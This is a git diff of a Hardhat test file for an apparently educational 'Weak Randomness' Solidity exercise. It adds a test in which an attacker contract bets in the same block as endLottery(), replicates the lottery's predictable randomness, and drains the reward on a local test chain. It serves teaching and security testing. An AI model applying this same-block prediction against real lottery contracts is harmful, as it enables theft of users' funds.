@@ -83,6 +83,7 @@ describe("Weak Randomness", function () {
 
         expect(attackerFinalBalance).to.be.gt(attackerInitialBalance);
       });
+      /*
       it("Replicate random logic within the same block", async function () {
         await this.lotteryAttacker.attack({ value: ethers.utils.parseEther("10") });
         await this.lottery.endLottery();
@@ -91,6 +92,47 @@ describe("Weak Randomness", function () {
         console.log("Attacker number: " + (await this.lottery.bets(this.lotteryAttacker.address)));
         console.log("Winning number: " + (await this.lottery.winningNumber()));
       });
+      */
     });
   });
+  
+  describe("Attacking the Lottery Contract - Replicated Logic Attack", function () {
+    it("Place a bet on the same block where the endLottery() will be mined", async function () {
+      // Placing some bets - Just to increase the reward to be claimed
+      await this.lottery.connect(user).placeBet(3, { value: this.lotteryFee })
+      await this.lottery.placeBet(1, { value: this.lotteryFee })
+      await ethers.provider.send("evm_mine");
+
+      // Performing the Replicated Logic Attack
+      await this.lotteryAttacker.connect(attacker).attack({ value: this.lotteryFee })
+      await this.lottery.endLottery();
+
+      // Manually mine the next block -- Will be included the two above transactions on the same block
+      await ethers.provider.send("evm_mine");
+      console.log(await ethers.provider.getBlock("latest"));
+
+      console.log("Winning Number was: ", await this.lottery.winningNumber());
+      console.log("Contract Attacker bet using the number: ", await this.lottery.bets(this.lotteryAttacker.address));
+
+      console.log("================= ETH Balances BEFORE claiming the rewards =================");
+      console.log("Lottery contract ETH Balance" , await ethers.provider.getBalance(this.lottery.address));
+      console.log("Attacker contract ETH Balance" , await ethers.provider.getBalance(this.lotteryAttacker.address));
+      console.log("Attacker Account ETH Balance" , await ethers.provider.getBalance(attacker.address));
+
+      const attackerBalanceBefore = await ethers.provider.getBalance(attacker.address); 
+      // Claim the rewards from the Attacker contract
+      await this.lotteryAttacker.connect(attacker).claimReward();
+      await ethers.provider.send("evm_mine");
+      const attackerBalanceAfter = await ethers.provider.getBalance(attacker.address);
+
+      console.log("================= ETH Balances AFTER claiming the rewards =================");
+      console.log("Lottery contract ETH Balance" , await ethers.provider.getBalance(this.lottery.address));
+      console.log("Attacker contract ETH Balance" , await ethers.provider.getBalance(this.lotteryAttacker.address));
+      console.log("Attacker Account ETH Balance" , await ethers.provider.getBalance(attacker.address));
+
+      // Comparing two numbers
+      expect(attackerBalanceAfter).to.be.gt(attackerBalanceBefore);
+    })
+  });
+  
 });
